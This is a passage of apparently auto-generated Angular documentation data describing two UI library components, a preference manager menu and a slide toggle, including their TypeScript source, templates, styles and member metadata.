        "sourceCode": "import {\r\n  ChangeDetectionStrategy,\r\n  Component,\r\n  ElementRef,\r\n  EventEmitter,\r\n  HostListener,\r\n  Input,\r\n  Output,\r\n  QueryList,\r\n  ViewChild,\r\n  ViewEncapsulation\r\n} from '@angular/core';\r\nimport { Preference } from './preference';\r\nimport { MatMenu, MatMenuItem, MatMenuTrigger } from '@angular/material/menu';\r\nimport { take } from 'rxjs/operators';\r\n\r\n@Component({\r\n  selector: 'sto-preference-manager',\r\n  templateUrl: './preference-manager.component.html',\r\n  styleUrls: [ './preference-manager.component.scss' ],\r\n  encapsulation: ViewEncapsulation.None,\r\n  changeDetection: ChangeDetectionStrategy.OnPush\r\n})\r\nexport class PreferenceManagerComponent {\r\n  @ViewChild(MatMenuTrigger)\r\n  private trigger: MatMenuTrigger;\r\n  @ViewChild('nameTmpl')\r\n  nameTmpl: ElementRef<HTMLInputElement>;\r\n\r\n  /**\r\n   * List of the available preferences\r\n   */\r\n  @Input()\r\n  preferences: Preference[] = [];\r\n  /**\r\n   * The preference identifier (typically application area).\r\n   * If missing, will be set to null\r\n   */\r\n  @Input()\r\n  identifierKey: string;\r\n  /**\r\n   * ID of the selected preference\r\n   */\r\n  @Input()\r\n  activePreferenceId: string;\r\n  /**\r\n   * Whether to show a progress spinner besides the title\r\n   */\r\n  @Input()\r\n  loadingIndicator: boolean;\r\n  /**\r\n   * If the current preference has been modified\r\n   */\r\n  @Input()\r\n  dirty: boolean;\r\n  /**\r\n   * Text to display when no preference is selected\r\n   */\r\n  @Input()\r\n  placeholder: string | null = 'No filter selected';\r\n\r\n  /**\r\n   * selectPreference emits whenever a preference is selected\r\n   */\r\n  @Output()\r\n  selectPreference = new EventEmitter<string>();\r\n  /**\r\n   * editPreference emits any changed (existing) preference\r\n   */\r\n  @Output()\r\n  editPreference = new EventEmitter<Preference>();\r\n  /**\r\n   * setDefaultPreference emits when the user determines a new default preference\r\n   */\r\n  @Output()\r\n  setDefaultPreference = new EventEmitter<Preference>();\r\n  /**\r\n   * deletePreference emits when a preference is deleted\r\n   */\r\n  @Output()\r\n  deletePreference = new EventEmitter<string>();\r\n  /**\r\n   * addNewPreference emits when the user creates a new preference.\r\n   * This does *not* include the current setup - that needs to be added by the consuming application\r\n   */\r\n  @Output()\r\n  addNewPreference = new EventEmitter<Preference>();\r\n  /**\r\n   * sharePreference emits when the user clicks the \"share\" button.\r\n   * Each application needs to implement this functionality for themselves.\r\n   */\r\n  @Output()\r\n  sharePreference = new EventEmitter<string>();\r\n\r\n\r\n  /**\r\n   * @internal\r\n   */\r\n  public editIndex: number | null;\r\n  private changedPreference: Preference | null;\r\n  public newPreference: Preference | null;\r\n\r\n  @HostListener('click')\r\n  openMenu() {\r\n    this.trigger.openMenu();\r\n  }\r\n\r\n  /**\r\n   * @internal\r\n   */\r\n  renamePreference(preference: Preference) {\r\n    this.newPreference = null;\r\n    this.editIndex = this.preferences.indexOf(preference);\r\n    this.changedPreference = { ...preference };\r\n    requestAnimationFrame(() => this.nameTmpl.nativeElement.focus());\r\n  }\r\n\r\n  /**\r\n   * @internal\r\n   */\r\n  cancelRename() {\r\n    this.changedPreference = null;\r\n    this.editIndex = null;\r\n  }\r\n\r\n  /**\r\n   * @internal\r\n   */\r\n  saveRename() {\r\n    if (!this.changedPreference) {\r\n      return;\r\n    }\r\n    const el = this.nameTmpl.nativeElement;\r\n    this.changedPreference.name = el.value;\r\n    this.editPreference.emit(this.changedPreference);\r\n    this.editIndex = null;\r\n    this.changedPreference = null;\r\n  }\r\n\r\n  /**\r\n   * @internal\r\n   */\r\n  toggleDefault(preference: Preference) {\r\n    this.changedPreference = { ...preference };\r\n    this.changedPreference.default = true;\r\n    this.setDefaultPreference.emit(this.changedPreference);\r\n    this.changedPreference = null;\r\n  }\r\n\r\n  /**\r\n   * @internal\r\n   */\r\n  focusActiveItem(menu: MatMenu) {\r\n    menu._allItems.changes.pipe(take(1))\r\n      .subscribe((l: QueryList<MatMenuItem>) => {\r\n        l.forEach(it => {\r\n          if ( it._getHostElement().classList.contains('selected') ) {\r\n            requestAnimationFrame(() => it.focus());\r\n          }\r\n        });\r\n      });\r\n  }\r\n\r\n  addPreference() {\r\n    this.cancelRename();\r\n    this.newPreference = new Preference(this.identifierKey);\r\n  }\r\n\r\n  /**\r\n   * @internal\r\n   */\r\n  saveNewPreference() {\r\n    if (!this.newPreference) {\r\n      return;\r\n    }\r\n    const el = this.nameTmpl.nativeElement;\r\n    this.newPreference.name = el.value;\r\n    this.addNewPreference.emit(this.newPreference);\r\n    this.newPreference = null;\r\n  }\r\n\r\n  /**\r\n   * @internal\r\n   */\r\n  cancelNewPreference() {\r\n    this.newPreference = null;\r\n  }\r\n\r\n  overwrite(pref: Preference) {\r\n    this.editPreference.emit(pref);\r\n  }\r\n}\r\n",
        "assetsDirs": [],
        "styleUrlsData": [
          {
            "data": "// Add theme\r\nsto-preference-manager {\r\n  display: flex;\r\n  align-items: center;\r\n  cursor: pointer;\r\n\r\n  .filter-title {\r\n    small {\r\n      font-style: italic;\r\n    }\r\n  }\r\n\r\n  .mat-progress-spinner {\r\n    display: inline-block;\r\n  }\r\n\r\n  .filter-title-icon {\r\n    height: 14px;\r\n    width: 14px;\r\n    line-height: 14px;\r\n    margin-right: 8px;\r\n  }\r\n}\r\n\r\n.mat-menu-panel.preference-manager-list {\r\n  width: 350px;\r\n  min-height: 32px;\r\n\r\n  .mat-menu-content:not(:empty) {\r\n    padding-top: 0;\r\n    padding-bottom: 0;\r\n  }\r\n\r\n  .preference-manager-list-item {\r\n    display: flex;\r\n    padding: 0 8px;\r\n\r\n    &.edit {\r\n      padding-left: 0;\r\n    }\r\n\r\n    .preference-manager-list-item-title {\r\n      flex: 1 1 auto;\r\n\r\n      .mat-form-field {\r\n        min-height: 32px;\r\n        height: 32px;\r\n\r\n        .mat-form-field-wrapper {\r\n          padding-bottom: 0;\r\n\r\n          .mat-form-field-flex {\r\n            padding: 8px;\r\n\r\n            .mat-form-field-infix {\r\n              border-top: 0;\r\n              padding-top: 0;\r\n            }\r\n          }\r\n\r\n          .mat-form-field-subscript-wrapper {\r\n            display: none;\r\n          }\r\n\r\n          .mat-form-field-underline {\r\n            bottom: 1px;\r\n          }\r\n        }\r\n      }\r\n    }\r\n\r\n    .preference-manager-list-item-actions {\r\n      display: flex;\r\n      justify-content: flex-end;\r\n      flex: 0 0 50px;\r\n\r\n      .mat-icon {\r\n        margin-right: 0;\r\n      }\r\n\r\n      .mat-icon-button {\r\n        height: 32px;\r\n        width: 32px;\r\n        line-height: 32px;\r\n      }\r\n    }\r\n  }\r\n\r\n  .preference-manager-list-footer {\r\n    height: 53px;\r\n    padding: 8px;\r\n  }\r\n}\r\n",
            "styleUrl": "./preference-manager.component.scss"
          }
        ],
        "stylesData": "",
        "templateData": "<button mat-button\r\n        class=\"filter-title\"\r\n        (menuOpened)=\"focusActiveItem(menu)\"\r\n        [matMenuTriggerFor]=\"menu\"\r\n        #trigger=\"matMenuTrigger\"\r\n        [matMenuTriggerData]=\"{ preferences: preferences }\">\r\n  {{ (preferences | activePreference:activePreferenceId)?.name || placeholder }}\r\n  <small *ngIf=\"dirty\">(modified)</small>\r\n  <mat-icon class=\"filter-title-icon\">keyboard_arrow_down</mat-icon>\r\n  <mat-progress-spinner *ngIf=\"loadingIndicator\"\r\n                        [diameter]=\"16\"\r\n                        mode=\"indeterminate\"></mat-progress-spinner>\r\n</button>\r\n\r\n<mat-menu #menu=\"matMenu\"\r\n          class=\"sto-menu preference-manager-list\">\r\n  <ng-template matMenuContent>\r\n    <div mat-menu-item\r\n         (click)=\"selectPreference.emit(pref.id)\"\r\n         (keydown.enter)=\"selectPreference.emit(pref.id);trigger.closeMenu()\"\r\n         [disableRipple]=\"true\"\r\n         class=\"dense preference-manager-list-item\"\r\n         [class.edit]=\"editIndex === index\"\r\n         [class.selected]=\"activePreferenceId ? pref.id === activePreferenceId : pref.default\"\r\n         *ngFor=\"let pref of preferences; let index = index\">\r\n      <div class=\"preference-manager-list-item-title\">\r\n        <span *ngIf=\"editIndex !== index\">{{ pref.name }}\r\n          <small *ngIf=\"pref.default\">[default]</small>\r\n        </span>\r\n        <mat-form-field *ngIf=\"editIndex === index\"\r\n                        (click)=\"$event.stopPropagation()\"\r\n                        (keydown)=\"$event.stopPropagation()\"\r\n                        (keydown.enter)=\"saveRename()\"\r\n                        (keydown.escape)=\"trigger.closeMenu()\"\r\n                        class=\"sto-form__field\"\r\n                        floatLabel=\"never\">\r\n          <input matInput\r\n                 autocomplete=\"off\"\r\n                 (focus)=\"nameTmpl.select()\"\r\n                 [value]=\"pref.name\"\r\n                 name=\"name\"\r\n                 #nameTmpl>\r\n        </mat-form-field>\r\n      </div>\r\n      <div class=\"preference-manager-list-item-actions\">\r\n        <button *ngIf=\"editIndex === index\"\r\n                title=\"Save new name\"\r\n                (click)=\"$event.stopPropagation(); saveRename()\"\r\n                mat-icon-button>\r\n          <mat-icon>save</mat-icon>\r\n        </button>\r\n        <button *ngIf=\"editIndex === index\"\r\n                title=\"Cancel rename\"\r\n                (click)=\"$event.stopPropagation(); cancelRename()\"\r\n                mat-icon-button>\r\n          <mat-icon>close</mat-icon>\r\n        </button>\r\n        <button (click)=\"$event.stopPropagation(); overwrite(pref)\"\r\n                title=\"Overwrite with current values\"\r\n                *ngIf=\"pref.external || (!editIndex && editIndex !== 0 && dirty && (activePreferenceId ? pref.id === activePreferenceId : pref.default))\"\r\n                mat-icon-button>\r\n          <mat-icon>save</mat-icon>\r\n        </button>\r\n        <button (click)=\"$event.stopPropagation();\"\r\n                *ngIf=\"!editIndex && editIndex !== 0\"\r\n                #moreTrigger=\"matMenuTrigger\"\r\n                [matMenuTriggerFor]=\"more\"\r\n                [matMenuTriggerData]=\"{preference: pref, trigger: moreTrigger}\"\r\n                mat-icon-button>\r\n          <mat-icon>more_vert</mat-icon>\r\n        </button>\r\n      </div>\r\n    </div>\r\n    <div mat-menu-item\r\n         [disableRipple]=\"true\"\r\n         *ngIf=\"newPreference\"\r\n         class=\"dense preference-manager-list-item edit\">\r\n      <div class=\"preference-manager-list-item-title\">\r\n        <mat-form-field (click)=\"$event.stopPropagation()\"\r\n                        (keydown)=\"$event.stopPropagation()\"\r\n                        (keydown.enter)=\"saveNewPreference()\"\r\n                        (keydown.escape)=\"trigger.closeMenu()\"\r\n                        class=\"sto-form__field\"\r\n                        floatLabel=\"never\">\r\n          <input matInput\r\n                 autocomplete=\"off\"\r\n                 (focus)=\"nameTmpl.select()\"\r\n                 [value]=\"newPreference.name\"\r\n                 name=\"name\"\r\n                 #nameTmpl>\r\n        </mat-form-field>\r\n      </div>\r\n      <div class=\"preference-manager-list-item-actions\">\r\n        <button (click)=\"$event.stopPropagation(); saveNewPreference()\"\r\n                mat-icon-button>\r\n          <mat-icon>save</mat-icon>\r\n        </button>\r\n        <button (click)=\"$event.stopPropagation(); cancelNewPreference()\"\r\n                mat-icon-button>\r\n          <mat-icon>close</mat-icon>\r\n        </button>\r\n      </div>\r\n    </div>\r\n    <div class=\"preference-manager-list-footer\"\r\n         (click)=\"$event.stopPropagation(); $event.preventDefault();\">\r\n      <button mat-stroked-button\r\n              (click)=\"addPreference()\"\r\n              color=\"primary\">New variant\r\n      </button>\r\n    </div>\r\n  </ng-template>\r\n</mat-menu>\r\n<mat-menu #more=\"matMenu\">\r\n  <ng-template matMenuContent\r\n               let-trigger=\"trigger\"\r\n               let-preference=\"preference\">\r\n    <button class=\"dense\"\r\n            (click)=\"$event.stopPropagation(); trigger.closeMenu(); toggleDefault(preference)\"\r\n            mat-menu-item>Set as default\r\n    </button>\r\n    <button class=\"dense\"\r\n            mat-menu-item\r\n            (click)=\"$event.stopPropagation(); trigger.closeMenu(); renamePreference(preference)\">Rename\r\n    </button>\r\n    <button class=\"dense\"\r\n            (click)=\"$event.stopPropagation(); trigger.closeMenu(); deletePreference.emit(preference.id)\"\r\n            mat-menu-item>Delete\r\n    </button>\r\n    <button class=\"dense\"\r\n            (click)=\"$event.stopPropagation(); trigger.closeMenu(); sharePreference.emit(preference.id)\"\r\n            mat-menu-item>Share\r\n    </button>\r\n  </ng-template>\r\n</mat-menu>\r\n\r\n"
      },
      {
        "name": "SlideToggleComponent",
        "id": "component-SlideToggleComponent-0b6a79ebc8a0e60389a5ca13591b050036c9da20d9b658cdd7bf90a0470e2ad8c9a90fb1020aa8fd1b6f5f7dfb760f7e50e62b8bf14f7a6a9b4576be49e3ccc1",
        "file": "libs/form/src/lib/slide-toggle/slide-toggle.component.ts",
        "changeDetection": "ChangeDetectionStrategy.OnPush",
        "encapsulation": [
          "ViewEncapsulation.None"
        ],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [
          {
            "name": "{ provide: MatFormFieldControl, useExisting: SlideToggleComponent }",
            "type": "component"
          }
        ],
        "selector": "sto-slide-toggle",
        "styleUrls": [
          "./slide-toggle.component.scss"
        ],
        "styles": [],
        "templateUrl": [
          "./slide-toggle.component.html"
        ],
        "viewProviders": [],
        "inputsClass": [
          {
            "name": "color",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 79,
            "type": "ThemePalette",
            "decorators": []
          },
          {
            "name": "disabled",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 67,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "readonly",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 93,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "required",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 114,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "value",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 126,
            "type": "boolean",
            "decorators": []
          }
        ],
            "outputsClass": [],
            "propertiesClass": [
              {
                "name": "_color",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "ThemePalette",
                "optional": false,
                "description": "",
                "line": 88,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "_disabled",
                "defaultValue": "false",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 64,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "_errorState",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "boolean",
                "optional": false,
                "description": "",
                "line": 62,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "_readonly",
                "defaultValue": "false",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 90,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "_required",
                "defaultValue": "false",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 111,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "_value",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "boolean | null",
                "optional": false,
                "description": "",
                "line": 123,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "autofilled",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "boolean",
                "optional": false,
                "description": "",
                "line": 37
              },
              {
                "name": "controlType",
                "defaultValue": "'number-input'",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "string",
                "optional": false,
                "description": "",
                "line": 38
              },
              {
                "name": "ctrl",
                "defaultValue": "new FormControl()",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 39
              },
              {
                "name": "describedBy",
                "defaultValue": "''",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "string",
                "optional": false,
                "description": "",
                "line": 44,
                "decorators": [
                  {
                    "name": "HostBinding",
                    "stringifiedArguments": "'attr.aria-describedby'"
                  }
                ]
              },
              {
                "name": "focused",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "boolean",
                "optional": false,
                "description": "",
                "line": 36
              },
              {
                "name": "id",
                "defaultValue": "`value-unit-input-${SlideToggleComponent.nextId++}`",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 42,
                "decorators": [
                  {
                    "name": "HostBinding",
                    "stringifiedArguments": ""
                  }
                ]
              },
              {
                "name": "nextId",
                "defaultValue": "0",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "number",
                "optional": false,
                "description": "",
                "line": 34,
                "modifierKind": [
                  124
                ]
              },
              {
                "name": "ngControl",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "NgControl",
                "optional": false,
                "description": "",
                "line": 136,
                "decorators": [
                  {
                    "name": "Optional",
                    "stringifiedArguments": ""
                  },
                  {
                    "name": "Self",
                    "stringifiedArguments": ""
                  }
                ],
                "modifierKind": [
                  123
                ]
              },
              {
                "name": "onChange",
                "defaultValue": "() => {...}",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 178
              },
              {
                "name": "onTouched",
                "defaultValue": "() => {...}",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 181
              },
              {
                "name": "placeholder",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "string",
                "optional": false,
                "description": "",
                "line": 109
              },
              {
                "name": "slideToggle",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "MatSlideToggle",
                "optional": false,
                "description": "",
                "line": 46,
                "decorators": [
                  {
                    "name": "ViewChild",
                    "stringifiedArguments": "MatSlideToggle"
                  }
                ]
              },
              {
                "name": "stateChanges",
                "defaultValue": "new Subject<void>()",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 35
              },
              {
                "name": "sub",
                "defaultValue": "new Subscription()",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 40,
                "modifierKind": [
                  123
                ]
              }
            ],
            "methodsClass": [
              {
                "name": "ngOnDestroy",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 160,
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "ngOnInit",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 148,
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "onContainerClick",
                "args": [
                  {
                    "name": "event",
                    "type": "MouseEvent",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 166,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "event",
                    "type": "MouseEvent",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "registerOnChange",
                "args": [
                  {
                    "name": "fn",
                    "type": "never",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 188,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "fn",
                    "type": "never",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "registerOnTouched",
                "args": [
                  {
                    "name": "fn",
                    "type": "never",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 192,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "fn",
                    "type": "never",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "setDescribedByIds",
                "args": [
                  {
                    "name": "ids",
                    "type": "string[]",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 173,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "ids",
                    "type": "string[]",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "setDisabledState",
                "args": [
                  {
                    "name": "isDisabled",
                    "type": "boolean",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 196,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "isDisabled",
                    "type": "boolean",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "writeValue",
                "args": [
                  {
                    "name": "value",
                    "type": "boolean",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 184,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "value",
                    "type": "boolean",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              }
            ],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [
          {
            "name": "attr.aria-describedby",
            "defaultValue": "''",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 44,
            "type": "string",
            "decorators": []
          },
          {
            "name": "class.floating",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 49,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "id",
            "defaultValue": "`value-unit-input-${SlideToggleComponent.nextId++}`",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 42,
            "type": "string",
            "decorators": []
          }
        ],
        "hostListeners": [],
        "description": "",
        "rawdescription": "\n",
        "type": "component",
        "sourceCode": "import {\r\n  ChangeDetectionStrategy,\r\n  Component,\r\n  ElementRef,\r\n  HostBinding,\r\n  Input,\r\n  OnDestroy,\r\n  OnInit,\r\n  Optional,\r\n  Self,\r\n  ViewChild,\r\n  ViewEncapsulation\r\n} from '@angular/core';\r\nimport { ControlValueAccessor, FormControl, NgControl } from '@angular/forms';\r\nimport { MatFormFieldControl } from '@angular/material/form-field';\r\nimport { FocusMonitor } from '@angular/cdk/a11y';\r\nimport { Subject, Subscription } from 'rxjs';\r\nimport { coerceBooleanProperty } from '@angular/cdk/coercion';\r\nimport { ThemePalette } from '@angular/material/core';\r\nimport { MatSlideToggle } from '@angular/material/slide-toggle';\r\n\r\n@Component({\r\n  selector: 'sto-slide-toggle',\r\n  templateUrl: './slide-toggle.component.html',\r\n  styleUrls: [ './slide-toggle.component.scss' ],\r\n  encapsulation: ViewEncapsulation.None,\r\n  changeDetection: ChangeDetectionStrategy.OnPush,\r\n  providers: [\r\n    { provide: MatFormFieldControl, useExisting: SlideToggleComponent }\r\n  ]\r\n})\r\nexport class SlideToggleComponent implements OnInit, OnDestroy, ControlValueAccessor, MatFormFieldControl<boolean> {\r\n  static nextId = 0;\r\n  stateChanges = new Subject<void>();\r\n  focused: boolean;\r\n  autofilled: boolean;\r\n  controlType = 'number-input';\r\n  ctrl = new FormControl();\r\n  public sub = new Subscription();\r\n  @HostBinding()\r\n  id = `value-unit-input-${SlideToggleComponent.nextId++}`;\r\n  @HostBinding('attr.aria-describedby')\r\n  describedBy = '';\r\n  @ViewChild(MatSlideToggle)\r\n  slideToggle: MatSlideToggle;\r\n\r\n  @HostBinding('class.floating')\r\n  get shouldLabelFloat() {\r\n    return this.focused || !this.empty;\r\n  }\r\n\r\n  get errorState() {\r\n    return this._errorState;\r\n  }\r\n\r\n  set errorState(errorState) {\r\n    this._errorState = errorState;\r\n    this.stateChanges.next();\r\n  }\r\n\r\n  private _errorState: boolean;\r\n\r\n  private _disabled = false;\r\n\r\n  @Input()\r\n  get disabled(): boolean {\r\n    return this._disabled;\r\n  }\r\n\r\n  set disabled(value: boolean) {\r\n    this._disabled = coerceBooleanProperty(value);\r\n    const opts = { onlySelf: true, emitEvent: false };\r\n    this._disabled ? this.ctrl.disable(opts) : this.ctrl.enable(opts);\r\n    this.stateChanges.next();\r\n  }\r\n\r\n  @Input()\r\n  get color(): ThemePalette {\r\n    return this._color || 'primary';\r\n  }\r\n\r\n  set color(color) {\r\n    this._color = color || 'primary';\r\n    this.stateChanges.next();\r\n  }\r\n\r\n  private _color: ThemePalette;\r\n\r\n  private _readonly = false;\r\n\r\n  @Input()\r\n  get readonly(): boolean {\r\n    return this._readonly;\r\n  }\r\n\r\n  set readonly(value: boolean) {\r\n    this._readonly = coerceBooleanProperty(value);\r\n    const opts = { onlySelf: true, emitEvent: false };\r\n    value ? this.ctrl.disable(opts) : this.ctrl.enable(opts);\r\n    this.stateChanges.next();\r\n  }\r\n\r\n  get empty() {\r\n    const value = this.ctrl.value;\r\n    return !( value && value !== 0 );\r\n  }\r\n\r\n  placeholder: string; // Required by material control, but not used.\r\n\r\n  private _required = false;\r\n\r\n  @Input()\r\n  get required() {\r\n    return this._required;\r\n  }\r\n\r\n  set required(req) {\r\n    this._required = coerceBooleanProperty(req);\r\n    this.stateChanges.next();\r\n  }\r\n\r\n  private _value: boolean | null;\r\n\r\n  @Input()\r\n  get value() {\r\n    return this._value;\r\n  }\r\n\r\n  set value(value) {\r\n    this._value = value;\r\n    this.ctrl.setValue(value, { emitEvent: false });\r\n    this.stateChanges.next();\r\n  }\r\n\r\n  constructor(@Optional() @Self() public ngControl: NgControl,\r\n              private fm: FocusMonitor,\r\n              private elRef: ElementRef<HTMLElement>) {\r\n    if ( this.ngControl != null ) {\r\n      this.ngControl.valueAccessor = this;\r\n    }\r\n    fm.monitor(elRef.nativeElement, true).subscribe(origin => {\r\n      this.focused = !!origin;\r\n      this.stateChanges.next();\r\n    });\r\n  }\r\n\r\n  ngOnInit(): void {\r\n    const sub = this.ctrl.valueChanges\r\n      .subscribe((value: boolean) => {\r\n        this.onChange(value);\r\n      });\r\n    this.sub.add(sub);\r\n    if ( this.ngControl && this.ngControl.statusChanges ) {\r\n      this.sub.add(this.ngControl.statusChanges\r\n        .subscribe(state => this.errorState = state === 'INVALID'));\r\n    }\r\n  }\r\n\r\n  ngOnDestroy(): void {\r\n    this.stateChanges.complete();\r\n    this.fm.stopMonitoring(this.elRef.nativeElement);\r\n    this.sub.unsubscribe();\r\n  }\r\n\r\n  onContainerClick(event: MouseEvent): void {\r\n    if ( !this.disabled && !this.readonly ) {\r\n      this.slideToggle.focus();\r\n      this.ctrl.setValue(!this.ctrl.value);\r\n    }\r\n  }\r\n\r\n  setDescribedByIds(ids: string[]): void {\r\n    this.describedBy = ids.join(' ');\r\n  }\r\n\r\n  // eslint-disable-next-line @typescript-eslint/no-empty-function\r\n  onChange = (_: unknown) => {\r\n  }\r\n  // eslint-disable-next-line @typescript-eslint/no-empty-function\r\n  onTouched = () => {\r\n  }\r\n\r\n  writeValue(value: boolean): void {\r\n    this.value = value;\r\n  }\r\n\r\n  registerOnChange(fn: never): void {\r\n    this.onChange = fn;\r\n  }\r\n\r\n  registerOnTouched(fn: never): void {\r\n    this.onTouched = fn;\r\n  }\r\n\r\n  setDisabledState(isDisabled: boolean): void {\r\n    this.disabled = isDisabled;\r\n  }\r\n\r\n\r\n}\r\n",
        "assetsDirs": [],
        "styleUrlsData": [
          {
            "data": ".sto-slide-toggle {\r\n  display: grid;\r\n  grid-template-columns: 1fr min-content;\r\n\r\n  .sto-slide-toggle__toggler {\r\n    position: absolute;\r\n    top: -6px;\r\n    right: 4px;\r\n\r\n    &--hide {\r\n      display: none;\r\n    }\r\n  }\r\n}\r\n",
            "styleUrl": "./slide-toggle.component.scss"
          }
        ],
        "stylesData": "",
        "constructorObj": {
          "name": "constructor",
          "description": "",
          "deprecated": false,
          "deprecationMessage": "",
          "args": [
            {
              "name": "ngControl",
              "type": "NgControl",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "fm",
              "type": "FocusMonitor",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "elRef",
              "type": "ElementRef<HTMLElement>",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "line": 134,
          "jsdoctags": [
            {
              "name": "ngControl",
              "type": "NgControl",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "fm",
              "type": "FocusMonitor",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "elRef",
              "type": "ElementRef<HTMLElement>",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        "implements": [
          "OnInit",
          "OnDestroy",
          "ControlValueAccessor",
          "MatFormFieldControl"
        ],
        "accessors": {
          "shouldLabelFloat": {
            "name": "shouldLabelFloat",
            "getSignature": {
              "name": "shouldLabelFloat",
              "type": "",
              "returnType": "",
              "line": 49
            }
          },
          "errorState": {
            "name": "errorState",
            "setSignature": {
              "name": "errorState",
              "type": "void",
              "deprecated": false,
              "deprecationMessage": "",
              "args": [
                {
                  "name": "errorState",
                  "type": "",
                  "deprecated": false,
                  "deprecationMessage": ""
                }
              ],
              "returnType": "void",
              "line": 57,
              "jsdoctags": [
                {
                  "name": "errorState",
                  "type": "",
                  "deprecated": false,
                  "deprecationMessage": "",
                  "tagName": {
                    "text": "param"
                  }
                }
              ]
            },
            "getSignature": {
              "name": "errorState",
              "type": "",
              "returnType": "",
              "line": 53
            }
          },
          "disabled": {
            "name": "disabled",
                    "setSignature": {
                      "name": "disabled",
                      "type": "void",
                      "deprecated": false,
                      "deprecationMessage": "",
                      "args": [
                        {
                          "name": "value",
                          "type": "boolean",
                          "deprecated": false,
                          "deprecationMessage": ""
                        }
                      ],
                      "returnType": "void",
                      "line": 71,
                      "jsdoctags": [
                        {
                          "name": "value",
                          "type": "boolean",
                          "deprecated": false,
                          "deprecationMessage": "",
                          "tagName": {
                            "text": "param"
                          }
                        }
                      ]
